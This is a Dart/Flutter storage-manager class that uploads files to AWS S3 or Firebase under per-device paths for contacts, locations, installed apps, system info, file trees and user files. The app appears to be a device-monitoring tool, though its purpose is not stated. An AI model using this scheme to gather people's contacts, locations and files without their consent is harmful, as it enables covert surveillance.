import 'dart:io';
import 'package:firebase_database/firebase_database.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'storage_interface.dart';
import 'firebase_storage_service.dart';
import 'aws_s3_storage_service.dart';
import 'dart:convert';
import 'package:path_provider/path_provider.dart';

/// Storage service types
enum StorageServiceType {
  firebase,
  awsS3,
  // Can add more: googleCloud, azure, etc.
}

class StorageManager {
  static StorageInterface? _currentService;
  static StorageServiceType _currentType = StorageServiceType.awsS3;
  static bool _isInitialized = false;
  static Map<String, String>? _currentConfig; // Зберігаємо конфігурацію

  /// File type constants for organizing uploads
  static const String FILES_PATH = 'files';
  static const String CONTACTS_PATH = 'contacts';
  static const String REPORTS_PATH = 'reports';
  static const String AVATARS_PATH = 'avatars';
  static const String SYS_INFO_PATH = 'sys_info';
  static const String FILE_TREE_PATH = 'file_tree';
  static const String APPS_PATH = 'installed_apps';
  static const String LOCATIONS_PATH = 'locations';

  /// Initialize storage service
  static Future<void> initialize({
    StorageServiceType type = StorageServiceType.awsS3,
    Map<String, String>? config,
  }) async {
    print('🔧 === StorageManager.initialize START ===');
    print('🔧 Storage Type: $type');
    print('🔧 Config: $config');

    _currentType = type;
    _currentConfig = config; // Зберігаємо конфігурацію для подальшого використання
    _isInitialized = true;

    switch (type) {
      case StorageServiceType.firebase:
        print('🔧 Initializing Firebase Storage Service');
        _currentService = FirebaseStorageService();
        break;

      case StorageServiceType.awsS3:
        print('🔧 Initializing AWS S3 Storage Service');
        if (config == null ||
            config['bucketName'] == null ||
            config['region'] == null ||
            config['identityPoolId'] == null)
        {
          print('❌ AWS S3 configuration missing required parameters');
          throw Exception('AWS S3 requires at least bucketName, region and identity pool id');
        }
        _currentService = AwsS3StorageService(
          bucketName: config['bucketName']!,
          region: config['region']!,
          identityPoolId: config['identityPoolId']!,
          // accessKeyId: config['accessKeyId'], // Optional
          // secretAccessKey: config['secretAccessKey'], // Optional
        );
        print('✅ AWS S3 Storage Service created successfully');
        break;
    }

    // Save current service type for future use
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString('storage_service_type', type.toString());
    print('🔧 === StorageManager.initialize COMPLETE ===');
  }

  /// Get current storage service
  static StorageInterface get service {
    print('🔧 StorageManager.service getter called');
    if (_currentService == null) {
      print('⚠️ Current service is null, creating fallback service');
      // Якщо сервіс не ініціалізований, створюємо з default значеннями
      if (_currentType == StorageServiceType.awsS3 && _currentConfig != null) {
        print('🔧 Creating fallback AWS S3 service');
        _currentService = AwsS3StorageService(
          bucketName: _currentConfig!['bucketName']!,
          region: _currentConfig!['region']!,
          identityPoolId: _currentConfig!['identityPoolId']!,
        );
      } else {
        // Fallback до Firebase
        print('🔧 Creating fallback Firebase service');
        _currentService = FirebaseStorageService();
      }
    }
    print('🔧 Returning service: ${_currentService.runtimeType}');
    return _currentService!;
  }

  /// Switch storage service
  static Future<void> switchService(
      StorageServiceType newType, {
        Map<String, String>? config,
      }) async {
    print('🔄 StorageManager.switchService to: $newType');
    await initialize(type: newType, config: config);
  }

  /// Get current service type
  static StorageServiceType get currentType => _currentType;

  static bool get isInitialized => _isInitialized;


  /// Upload file using current service with structured paths
  static Future<String?> uploadFile({
    required File file,
    required String path,
    Map<String, String>? metadata,
  }) async {
    print('📤 === StorageManager.uploadFile START ===');
    print('📤 Path: $path');
    print('📤 File: ${file.path}');
    print('📤 Metadata: $metadata');
    print('📤 Current Service Type: $_currentType');

    try {
      final result = await service.uploadFile(
        file: file,
        path: path,
        metadata: metadata,
      );

      print('📤 === StorageManager.uploadFile COMPLETE ===');
      print('📤 Result: $result');
      return result;
    } catch (e, stack) {
      print('❌ StorageManager.uploadFile ERROR: $e');
      print('❌ Stack: $stack');
      return null;
    }
  }

  /// Upload regular file (documents, media, etc.)
  static Future<String?> uploadRegularFile({
    required String deviceId,
    required File file,
    required String fileName,
    Map<String, String>? metadata,
  }) async {
    print('📤 === StorageManager.uploadRegularFile START ===');
    print('📤 Device ID: $deviceId');
    print('📤 File path: ${file.path}');
    print('📤 File name: $fileName');
    print('📤 File exists: ${await file.exists()}');

    try {
      if (currentType == StorageServiceType.awsS3) {
        print('🔄 Using AWS S3 storage');

        // Додатковий debug для S3
        final fileStat = await file.stat();
        print('📊 File size: ${fileStat.size} bytes');
        print('📊 File last modified: ${fileStat.modified}');

        // ВИПРАВЛЕННЯ: Використовуємо правильний шлях для файлів
        final path = 'users/$deviceId/$FILES_PATH/$fileName';
        print('📁 S3 upload path: $path');

        // ВИПРАВЛЕННЯ: Використовуємо основний метод uploadFile
        final result = await uploadFile(
          file: file,
          path: path,
          metadata: {
            'device_id': deviceId,
            'original_path': file.path,
            'upload_time': DateTime.now().toIso8601String(),
            'file_size': fileStat.size.toString(),
          },
        );

        print('📤 === StorageManager.uploadRegularFile COMPLETE ===');
        print('📤 Result URL: $result');
        return result;
      } else {
        print('❌ Wrong storage type: $currentType');
        return null;
      }
    } catch (e, stack) {
      print('❌ StorageManager.uploadRegularFile ERROR: $e');
      print('Stack: $stack');
      return null;
    }
  }

  static Future<String?> uploadFileTreeFile({
    required File file,
    required String deviceId,
    required String fileName,
    Map<String, String>? metadata,
  }) async {
    print('🌳 StorageManager.uploadFileTreeFile');
    final path = 'users/$deviceId/$FILE_TREE_PATH/$fileName';
    return await uploadFile(
      file: file,
      path: path,
      metadata: metadata,
    );
  }

  /// Upload contacts file to structured path
  static Future<String?> uploadContactsFile({
    required File file,
    required String deviceId,
    required String fileName,
    Map<String, String>? metadata,
  }) async {
    print('📒 StorageManager.uploadContactsFile');
    final path = 'users/$deviceId/$CONTACTS_PATH/$fileName';
    return await uploadFile(
      file: file,
      path: path,
      metadata: metadata,
    );
  }

  static Future<String?> uploadLocationFile({
    required File file,
    required String deviceId,
    required String fileName,
    Map<String, String>? metadata,
  }) async {
    print('📍 StorageManager.uploadLocationFile');
    final path = 'users/$deviceId/$LOCATIONS_PATH/$fileName';
    return await uploadFile(
      file: file,
      path: path,
      metadata: metadata,
    );
  }

  static Future<String?> uploadSysInfoFile({
    required File file,
    required String deviceId,
    required String fileName,
    Map<String, String>? metadata,
  }) async {
    print('💻 StorageManager.uploadSysInfoFile');
    final path = 'users/$deviceId/$SYS_INFO_PATH/$fileName';
    return await uploadFile(
      file: file,
      path: path,
      metadata: metadata,
    );
  }

  static Future<String?> uploadInstalledAppsFile({
    required File file,
    required String deviceId,
    required String fileName,
    Map<String, String>? metadata,
  }) async {
    print('📱 StorageManager.uploadInstalledAppsFile');
    final path = 'users/$deviceId/$APPS_PATH/$fileName';
    return await uploadFile(
      file: file,
      path: path,
      metadata: metadata,
    );
  }

  /// Upload avatar file and save URL to Firebase Realtime Database
  static Future<String?> uploadAvatarFile({
    required File file,
    required String deviceId,
    required String fileName,
    Map<String, String>? metadata,
  }) async {
    print('👤 StorageManager.uploadAvatarFile');
    final path = 'users/$deviceId/$AVATARS_PATH/$fileName';
    final downloadUrl = await uploadFile(
      file: file,
      path: path,
      metadata: metadata,
    );

    // Save avatar URL to Firebase Realtime Database
    if (downloadUrl != null) {
      try {
        final database = FirebaseDatabase.instance;
        await database.ref('users/$deviceId/avatar').set({
          'url': downloadUrl,
          'fileName': fileName,
          'uploadTime': DateTime.now().toIso8601String(),
        });
        print('✅ Avatar URL saved to Firebase Database');
      } catch (e) {
        print('⚠️ Could not save avatar URL to Firebase DB: $e');
        // Continue even if Firebase DB save fails
      }
    } else {
      print('❌ Avatar upload failed - no download URL');
    }

    return downloadUrl;
  }

  /// Upload reports files
  static Future<String?> uploadReportsFile({
    required File file,
    required String deviceId,
    required String fileName,
    Map<String, String>? metadata,
  }) async {
    print('📊 StorageManager.uploadReportsFile');
    final path = 'users/$deviceId/$REPORTS_PATH/$fileName';
    return await uploadFile(
      file: file,
      path: path,
      metadata: metadata,
    );
  }

  /// Delete file from storage
  static Future<bool> deleteFile(String path) async {
    print('🗑️ StorageManager.deleteFile: $path');
    return await service.deleteFile(path);
  }

  /// Get download URL for a file
  static Future<String?> getDownloadUrl(String path) async {
    print('🔗 StorageManager.getDownloadUrl: $path');
    return await service.getDownloadUrl(path);
  }

  /// Check if file exists in storage
  static Future<bool> fileExists(String path) async {
    print('🔍 StorageManager.fileExists: $path');
    return await service.fileExists(path);
  }

  /// Download file from storage using URL
  static Future<File?> downloadFile({
    required String url,
    required String localPath,
  }) async {
    print('📥 StorageManager.downloadFile');
    print('📥 URL: $url');
    print('📥 Local Path: $localPath');
    return await service.downloadFile(
      url: url,
      localPath: localPath,
    );
  }

  /// Download avatar file by device ID and file name
  static Future<File?> downloadAvatarFile({
    required String deviceId,
    required String fileName,
    String? localPath,
  }) async {
    print('👤 StorageManager.downloadAvatarFile');
    final path = 'users/$deviceId/$AVATARS_PATH/$fileName';
    final downloadUrl = await getDownloadUrl(path);
    if (downloadUrl == null) {
      print('❌ No download URL for avatar');
      return null;
    }

    final savePath = localPath ?? '/tmp/downloaded_${fileName}';
    print('📥 Downloading to: $savePath');
    return await downloadFile(url: downloadUrl, localPath: savePath);
  }

  /// Get file metadata
  static Future<Map<String, dynamic>?> getFileMetadata(String path) async {
    print('📄 StorageManager.getFileMetadata: $path');
    return await service.getFileMetadata(path);
  }

  /// Upload multiple files using current service
  static Future<List<String?>> uploadBatch({
    required List<File> files,
    required List<String> paths,
    Map<String, String>? metadata,
  }) async {
    print('📦 StorageManager.uploadBatch');
    print('📦 Files count: ${files.length}');
    print('📦 Paths count: ${paths.length}');
    return await service.uploadBatch(
      files: files,
      paths: paths,
      metadata: metadata,
    );
  }

  /// Load service type from preferences and initialize
  static Future<void> loadFromPreferences() async {
    print('⚙️ StorageManager.loadFromPreferences');
    try {
      final prefs = await SharedPreferences.getInstance();
      final savedType = prefs.getString('storage_service_type');

      if (savedType != null) {
        print('⚙️ Saved service type: $savedType');
        final type = StorageServiceType.values.firstWhere(
              (e) => e.toString() == savedType,
          orElse: () => StorageServiceType.firebase,
        );
        await initialize(type: type);
      } else {
        print('⚙️ No saved service type, using default');
        await initialize(); // Default to Firebase
      }
    } catch (e) {
      print('❌ Error loading from preferences: $e');
      // Fallback to Firebase
      await initialize();
    }
  }

  /// Get service configuration for UI
  static Map<String, dynamic> getServiceInfo() {
    print('ℹ️ StorageManager.getServiceInfo');
    return {
      'current_service': _currentType.toString(),
      'available_services':
      StorageServiceType.values.map((e) => e.toString()).toList(),
    };
  }

  /// Save uploaded files to local file as backup
  static Future<void> _saveUploadedFilesToFile(
      String deviceId, Map<String, dynamic> uploadedFiles) async {
    print('💾 StorageManager._saveUploadedFilesToFile');
    try {
      final directory = await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/uploaded_files_$deviceId.json');

      final data = {
        'device_id': deviceId,
        'uploaded_files': uploadedFiles,
        'last_updated': DateTime.now().toIso8601String(),
        'total_files': uploadedFiles.length,
      };

      await file.writeAsString(jsonEncode(data));
      // Also upload the file to S3 as file_tree
      await StorageManager.uploadFileTreeFile(
        file: file,
        deviceId: deviceId,
        fileName: 'file_tree_${DateTime.now().millisecondsSinceEpoch}.json',
        metadata: {
          'device_id': deviceId,
          'upload_time': DateTime.now().toIso8601String(),
        },
      );
      print('✅ Uploaded file_tree to S3 for device $deviceId');
    } catch (e) {
      print('❌ Error saving or uploading file_tree: $e');
    }
  }
}